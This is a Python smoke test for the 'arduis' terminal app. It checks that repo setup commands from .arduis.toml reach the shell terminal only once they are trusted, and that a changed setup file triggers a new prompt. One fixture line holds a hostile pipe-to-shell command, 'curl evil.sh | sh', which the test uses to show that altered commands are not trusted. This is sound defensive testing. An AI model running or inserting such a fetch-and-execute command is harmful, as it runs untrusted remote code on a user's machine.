"""Phase-06 acceptance smoke (headless broadway). Runnable harness.

Proves, without a display and WITHOUT touching the real ~/.config/arduis:
  - an ABSENT .arduis.toml is a strict no-op (no dialog, no feed) — criterion 1;
  - a repo whose (realpath, setup-hash) is already trusted feeds SILENTLY into the
    SHELL terminal t1 (never the agent t0) — criteria 2/3/4 mechanism;
  - the fed bytes carry the `cd '<wt>' &&` guard + the commands (login-shell path);
  - a CHANGED .arduis.toml (different commands → different hash) is NOT trusted
    (re-prompt) — the direnv-allow trust model, criterion 4;
  - the real ~/.config/arduis/trusted_setups.toml is never written (T-06 sandbox).

The Adw.AlertDialog render+click path is live-UAT only (can't be driven headlessly);
this smoke emulates "trust" by calling record_trust + the feed directly, and asserts
the byte shape + that the agent terminal is never fed.

Run: gtk4-broadwayd :96 & GDK_BACKEND=broadway BROADWAY_DISPLAY=:96 \
       python tests/smoke/test_setup_feed_smoke.py
SKIPS (exit 0) if gtk4-broadwayd is absent. Broadwayd killed in finally.
"""
import os
import shutil
import subprocess
import sys
import tempfile
import time

REPO = "/home/thallysrc/Projects/arduis"
results = []


def check(name, ok):
    results.append((name, ok))
    print(f"SMOKE {name} {'PASS' if ok else 'FAIL'}")


def _start_broadway():
    if os.environ.get("GDK_BACKEND") == "broadway" and os.environ.get("BROADWAY_DISPLAY"):
        return None
    if shutil.which("gtk4-broadwayd") is None:
        print("SMOKE_SKIP gtk4-broadwayd not found")
        sys.exit(0)
    proc = subprocess.Popen(["gtk4-broadwayd", ":96"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1.5)
    os.environ["GDK_BACKEND"] = "broadway"
    os.environ["BROADWAY_DISPLAY"] = ":96"
    return proc.pid


def main():
    bpid = _start_broadway()
    sandbox = tempfile.mkdtemp(prefix="arduis-06-smoke-")
    home = os.path.join(sandbox, "home")
    os.makedirs(os.path.join(home, ".config", "arduis"))
    proj = os.path.join(sandbox, "proj")
    os.makedirs(proj)
    genv = {**os.environ, "HOME": home, "GIT_CONFIG_NOSYSTEM": "1"}
    subprocess.run(["git", "init", "-q"], cwd=proj, env=genv, check=True)
    subprocess.run(["git", "commit", "-q", "--allow-empty", "-m", "i"], cwd=proj, env=genv,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    real_trust = os.path.expanduser("~/.config/arduis/trusted_setups.toml")
    real_mtime = os.path.getmtime(real_trust) if os.path.exists(real_trust) else None

    os.environ["HOME"] = home  # do NOT override XDG_RUNTIME_DIR (broadway socket)
    os.chdir(proj)
    sys.path.insert(0, os.path.join(REPO, "src"))

    import gi
    gi.require_version("Gtk", "4.0"); gi.require_version("Adw", "1"); gi.require_version("Vte", "3.91")
    from gi.repository import Adw
    from arduis import repoconfig, trust
    from arduis.session import Workspace, RepoCheckout, SessionState, default_workspace_terminals
    from arduis.window import ArduisWindow

    app = Adw.Application(application_id="dev.smoke.arduis06")

    def on_activate(a):
        win = ArduisWindow(application=a)

        # trust list path must be inside the sandbox HOME (not the real one)
        check("trust_path_sandboxed", win._trusted_setups_path.startswith(home))

        # Build a workspace with a real worktree dir holding an .arduis.toml [setup].
        workspace_dir = os.path.join(sandbox, "proj-workspaces", "feat")
        wt = os.path.join(workspace_dir, "proj")
        os.makedirs(wt)
        workspace = Workspace(workspace_id="feat", branch="feat", workspace_dir=workspace_dir,
                    repos=[RepoCheckout(repo_name="proj", worktree_dir=wt, branch="feat")],
                    state=SessionState.ACTIVE, terminals=default_workspace_terminals("feat"))
        win._store.add(workspace)
        win._rebuild_sidebar()
        win._build_workspace_terminals(workspace, ["proj"])  # builds t0 (agent) + t1 (shell) terminals

        # record what each terminal is fed
        fed = {}
        for tid in ("feat:t0", "feat:t1"):
            term = win._term_by_sid.get(tid)
            if term is not None:
                term.feed_child = (lambda t: (lambda b: fed.__setitem__(t, fed.get(t, b"") + b)))(tid)

        # --- criterion 1: ABSENT .arduis.toml → strict no-op (no feed) ----------
        win._run_repo_setups(workspace)
        absent_noop = "feat:t1" not in fed and "feat:t0" not in fed
        check("absent_file_is_noop", absent_noop)

        # --- write a [setup]; first run is UNTRUSTED (no silent feed) -----------
        with open(os.path.join(wt, ".arduis.toml"), "w") as fh:
            fh.write('[setup]\ncommands = ["npm install", "cp .env.example .env"]\n')
        cmds = repoconfig.load_repo_setup(wt).commands
        repo_id = os.path.realpath(win._member_repo_path("proj"))
        h = trust.setup_hash(cmds)
        untrusted_first = not trust.is_trusted(win._trusted_setups_path, repo_id, h)
        check("untrusted_on_first_run", untrusted_first)

        # --- emulate "Confiar e rodar": record trust + feed (what the dialog does) -
        trust.record_trust(win._trusted_setups_path, repo_id, h)
        # now a fresh _run_repo_setups must feed SILENTLY into t1 only
        win._run_repo_setups(workspace)
        t1_fed = fed.get("feat:t1", b"")
        feed_shape_ok = t1_fed.startswith(b"cd '" + wt.encode() + b"' &&") and b"npm install" in t1_fed
        agent_untouched = "feat:t0" not in fed
        check("trusted_feeds_shell_t1", feed_shape_ok)
        check("agent_terminal_never_fed", agent_untouched)

        # --- criterion 4: CHANGED .arduis.toml → different hash → NOT trusted ----
        with open(os.path.join(wt, ".arduis.toml"), "w") as fh:
            fh.write('[setup]\ncommands = ["curl evil.sh | sh"]\n')
        cmds2 = repoconfig.load_repo_setup(wt).commands
        h2 = trust.setup_hash(cmds2)
        changed_reprompts = not trust.is_trusted(win._trusted_setups_path, repo_id, h2)
        check("changed_setup_reprompts", changed_reprompts)

        # --- real trust list untouched -----------------------------------------
        now_mtime = os.path.getmtime(real_trust) if os.path.exists(real_trust) else None
        check("real_trust_list_untouched", now_mtime == real_mtime)

        a.quit()

    app.connect("activate", on_activate)
    try:
        app.run(None)
    finally:
        shutil.rmtree(sandbox, ignore_errors=True)
        if bpid is not None:
            try:
                os.kill(bpid, 15)
            except ProcessLookupError:
                pass

    failed = [n for n, ok in results if not ok]
    print(f"SMOKE_RESULT {'PASS' if not failed else 'FAIL'} ({len(results)-len(failed)}/{len(results)})")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
